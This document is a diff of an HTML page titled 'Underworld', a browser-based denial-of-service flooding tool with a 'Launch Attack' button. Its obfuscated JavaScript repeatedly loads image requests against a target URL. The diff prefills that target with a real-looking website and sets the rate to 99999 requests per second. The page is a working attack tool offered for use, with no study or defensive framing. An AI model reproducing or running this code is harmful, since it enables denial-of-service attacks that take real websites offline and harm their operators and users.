@@ -3,21 +3,22 @@
 
 <head>
 	<meta charset="UTF-8">
-	<title>Underworld</title>
+	<title>U N D E R W O R L D</title>
 	<meta name="author" content="manlydev">
-	<link rel="icon" href="https://cdn2.vectorstock.com/i/thumb-large/48/16/cybersecurity-icon-online-protection-symbol-vector-21344816.jpg">
-	<link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
-	<style>
+	<meta name="version" content="15.100.221027.1">
+	<link rel="icon" href="https://static.vecteezy.com/system/resources/previews/010/760/730/non_2x/uw-logo-u-w-design-white-uw-letter-uw-letter-logo-design-initial-letter-uw-linked-circle-uppercase-monogram-logo-vector.jpg">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins&display=swap">
+	<style id="Underworld">
 		body {
 			font-family: 'Poppins', sans-serif;
 			font-size: 16px;
-			background-image: url('https://images8.alphacoders.com/456/456424.jpg');
+			background-image: url('https://wallpapercave.com/wp/wp2406521.jpg');
 			background-repeat: no-repeat;
 		}
 
 		::selection {
 			background: none;
-			color: blue;
+			color: #0275d8;
 		}
 
 		::placeholder {
@@ -25,15 +26,20 @@
 			font-weight: 700;
 		}
 
+		#image {
+			padding: 5px;
+		}
+
+		#image:hover{
+			opacity: 0.5;
+		}
+
 		.form {
 			width: 600px;
 			margin-top: 175px !important;
 			margin: 0 auto;
-			backdrop-filter: blur(16px) saturate(180%);
-			-webkit-backdrop-filter: blur(16px) saturate(180%);
-			background-color: rgba(17, 25, 40, 0.75);
-			border-radius: 12px;
-			border: 1px solid rgba(255, 255, 255, 0.125);
+			background-color: #0D1117;
+			border-radius: 10px;
 		}
 
 		.target-url,
@@ -70,21 +76,21 @@
 
 		#requestedCtr {
 			background-color: transparent;
-			color: goldenrod;
+			color: #f0ad4e;
 			padding-left: 5px;
 			padding-right: 5px;
 		}
 
 		#succeededCtr {
 			background-color: transparent;
-			color: green;
+			color: #5cb85c;
 			padding-left: 5px;
 			padding-right: 5px;
 		}
 
 		#failedCtr {
 			background-color: transparent;
-			color: #a94442;
+			color: #d9534f;
 			padding-left: 5px;
 			padding-right: 5px;
 		}
@@ -106,12 +112,12 @@
 			position: relative;
 			padding: 1em 1.8em;
 			outline: none;
-			border: 0.5px solid #1d00ff;
+			border: 0.5px solid #0275d8;
 			backdrop-filter: blur(16px) saturate(180%);
 			-webkit-backdrop-filter: blur(16px) saturate(180%);
-			background-color: rgba(17, 25, 40, 0.75);
+			background-color: #0D1117;
 			border-radius: 12px;
-			color: #1d00ff;
+			color: #0275d8;
 			text-transform: uppercase;
 			letter-spacing: 2px;
 			font-size: 15px;
@@ -123,7 +129,7 @@
 		}
 
 		button:hover {
-			box-shadow: 0 0 10px #1d00ff, 0 0 25px #001eff, 0 0 50px #1d00ff;
+			box-shadow: 0 0 10px #0275d8, 0 0 25px #001eff, 0 0 50px #0275d8;
 			transition-delay: 0.6s;
 		}
 
@@ -136,7 +142,7 @@
 			left: -100%;
 			width: 100%;
 			height: 2px;
-			background: linear-gradient(90deg, transparent, #1d00ff);
+			background: linear-gradient(90deg, transparent, #0275d8);
 		}
 
 		button:hover span:nth-child(1) {
@@ -149,7 +155,7 @@
 			right: -100%;
 			width: 100%;
 			height: 2px;
-			background: linear-gradient(90deg, transparent, #1d00ff);
+			background: linear-gradient(90deg, transparent, #0275d8);
 		}
 
 		button:hover span:nth-child(3) {
@@ -163,7 +169,7 @@
 			right: 0;
 			width: 2px;
 			height: 100%;
-			background: linear-gradient(180deg, transparent, #1d00ff);
+			background: linear-gradient(180deg, transparent, #0275d8);
 		}
 
 		button:hover span:nth-child(2) {
@@ -177,7 +183,7 @@
 			left: 0;
 			width: 2px;
 			height: 100%;
-			background: linear-gradient(360deg, transparent, #1d00ff);
+			background: linear-gradient(360deg, transparent, #0275d8);
 		}
 
 		button:hover span:nth-child(4) {
@@ -188,9 +194,9 @@
 
 		button:active {
 			background: #ae00af;
-			background: linear-gradient(to top right, #ae00af, #1d00ff);
+			background: linear-gradient(to top right, #ae00af, #0275d8);
 			color: #bfbfbf;
-			box-shadow: 0 0 8px #1d00ff, 0 0 8px #001eff, 0 0 8px #1d00ff;
+			box-shadow: 0 0 8px #0275d8, 0 0 8px #001eff, 0 0 8px #0275d8;
 			transition: 0.1s;
 		}
 
@@ -201,58 +207,69 @@
 
 		input {
 			background: none;
-			border-bottom: 1px solid #1d00ff !important;
+			border-bottom: 1px solid #0275d8 !important;
 			outline: none;
 			border: none;
 			margin-left: 15px;
-			color: #1d00ff;
+			color: #0275d8;
 		}
 
 		::placeholder {
-			/*color: #1d00ff;*/
+			/*color: #0275d8;*/
 			font-family: Poppins;
 		}
 	</style>
 </head>
 
 <body>
-	<div class="form"> <br>
+	<div id="image">
+		<img src="https://underworldlive.com/wp-content/uploads/2019/06/Underworld-DRIFT-Logo-White-1400x232.png" width="300">
+	</div>
+	<div class="form">
+		<br>
 		<div class="target-url">
-			<label>Target URL :</label>
-			<input id="targetURL" value="">
+			<label>Target Website :</label>
+			<input id="targetURL" type="url" style="font-family: Poppins;" value="https://azpointblank.com">
 		</div>
 		<div class="requests-per-second">
-			<label>Packet Size :</label>
-			<input id="rps" value="999" />
+			<label>Requests Per Second :</label>
+			<input id="rps" style="width: 300px;font-family: Poppins;" value="99999">
 		</div>
 		<div class="message">
-			<label>Message :</label>
-			<input id="message" value="Manly Was Here">
-		</div> <br>
+			<label>GET Message :</label>
+			<input id="message" style="font-family: Poppins;" value="">
+		</div>
+		<br>
 		<div class="fire-button">
-			<button id="fireButton" onclick="ddos();"> <span></span>
+			<button id="fireButton" onclick="Underworld();">
 				<span></span>
 				<span></span>
-				<span></span> Start Flood</button>
+				<span></span>
+				<span></span>
+				Launch Attack
+			</button>
 		</div>
 		<div class="status">
 			<script type="text/javascript">
 				document.write(unescape('%3c%68%33%3e%45%6e%63%6f%64%65%72%20%4d%61%6e%6c%79%3c%2f%68%33%3e%20'));
 			</script>
 			<div>
-				<label class="requested">Requests :</label> <strong> &nbsp; <span id="requestedCtr">0</span></strong>
+				<label class="requested">Total Requests :</label> <strong> &nbsp; <span
+						id="requestedCtr">0</span></strong>
 			</div>
 			<div>
-				<label class="succeed">Sending Packets :</label> <strong> &nbsp; <span id="succeededCtr">
-						0</span></strong>
+				<label class="succeed">Success Requests :</label> <strong> &nbsp; <span
+						id="succeededCtr">0</span></strong>
 			</div>
 			<div>
-				<label class="failed">Failed :</label> <strong> &nbsp; <span id="failedCtr"> 0</span></strong>
-			</div> <br>
+				<label class="failed">Failed Requests :</label> <strong> &nbsp; <span id="failedCtr"> 0</span></strong>
+			</div>
+			<br>
 		</div>
 	</div>
 	<script>
-		function ddos() {
+		function Underworld() 
+		{
 			var _0x8a9e = ["\x72\x65\x71\x75\x65\x73\x74\x65\x64\x43\x74\x72", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x73\x75\x63\x63\x65\x65\x64\x65\x64\x43\x74\x72", "\x66\x61\x69\x6C\x65\x64\x43\x74\x72", "\x74\x61\x72\x67\x65\x74\x55\x52\x4C", "\x66\x69\x72\x65\x42\x75\x74\x74\x6F\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x72\x70\x73", "\x74\x69\x6D\x65\x6F\x75\x74", "\x76\x61\x6C\x75\x65", "\x6F\x6E\x63\x68\x61\x6E\x67\x65", "\x6F\x6E\x65\x72\x72\x6F\x72", "\x6F\x6E\x61\x62\x6F\x72\x74", "\x6F\x6E\x6C\x6F\x61\x64", "\x73\x72\x63", "\x3F\x69\x64\x3D", "\x26\x6D\x73\x67\x3D", "\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65", "\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C", "\x6F\x6E\x63\x6C\x69\x63\x6B", "\x4C\x41\x55\x4E\x43\x48\x20\x41\x54\x54\x41\x43\x4B", "\x53\x54\x4F\x50\x20\x46\x4C\x4F\x4F\x44\x49\x4E\x47"]; (function () { var _0xd640x1; var _0xd640x2 = false; var _0xd640x3 = document[_0x8a9e[1]](_0x8a9e[0]), _0xd640x4 = document[_0x8a9e[1]](_0x8a9e[2]), _0xd640x5 = document[_0x8a9e[1]](_0x8a9e[3]), _0xd640x6 = document[_0x8a9e[1]](_0x8a9e[4]), _0xd640x7 = document[_0x8a9e[1]](_0x8a9e[5]), _0xd640x8 = document[_0x8a9e[1]](_0x8a9e[6]), _0xd640x9 = document[_0x8a9e[1]](_0x8a9e[7]), _0xd640xa = document[_0x8a9e[1]](_0x8a9e[8]); var _0xd640xb = _0xd640x6[_0x8a9e[9]]; _0xd640x6[_0x8a9e[10]] = function () { _0xd640xb = this[_0x8a9e[9]]; }; var _0xd640xc = {}; var _0xd640xd = 0, _0xd640xe = 0, _0xd640xf = 0; var _0xd640x10 = function () { if (_0xd640xd > _0xd640xf + _0xd640xe + 1000) { return; }; var _0xd640x11 = Number(new Date()); var _0xd640x12 = new Image(); _0xd640x12[_0x8a9e[11]] = function () { _0xd640x15(_0xd640x11); }; _0xd640x12[_0x8a9e[12]] = function () { _0xd640x15(_0xd640x11); }; _0xd640x12[_0x8a9e[13]] = function () { _0xd640x16(_0xd640x11); }; _0xd640x12[_0x8a9e[17]](_0x8a9e[14], _0xd640xb + _0x8a9e[15] + _0xd640x11 + _0x8a9e[16] + _0xd640x8[_0x8a9e[9]]); _0xd640xc[_0xd640x11] = _0xd640x12; _0xd640x13(_0xd640x11); }; var _0xd640x13 = function (_0xd640x11) { _0xd640xd++; _0xd640x3[_0x8a9e[18]] = _0xd640xd; }; var _0xd640x14 = function (_0xd640x11) { delete _0xd640xc[_0xd640x11]; }; var _0xd640x15 = function (_0xd640x11) { _0xd640xe++; _0xd640x4[_0x8a9e[18]] = _0xd640xe; delete _0xd640xc[_0xd640x11]; }; var _0xd640x16 = function (_0xd640x11) { _0xd640xe++; _0xd640x4[_0x8a9e[18]] = _0xd640xe; delete _0xd640xc[_0xd640x11]; }; _0xd640x7[_0x8a9e[19]] = function () { if (_0xd640x2) { clearInterval(_0xd640x1); _0xd640x2 = false; this[_0x8a9e[18]] = _0x8a9e[20]; } else { _0xd640x2 = true; this[_0x8a9e[18]] = _0x8a9e[21]; _0xd640x1 = setInterval(_0xd640x10, 1000 / parseInt(_0xd640x9[_0x8a9e[9]]) | 0); } }; })();
 		}
 	</script>
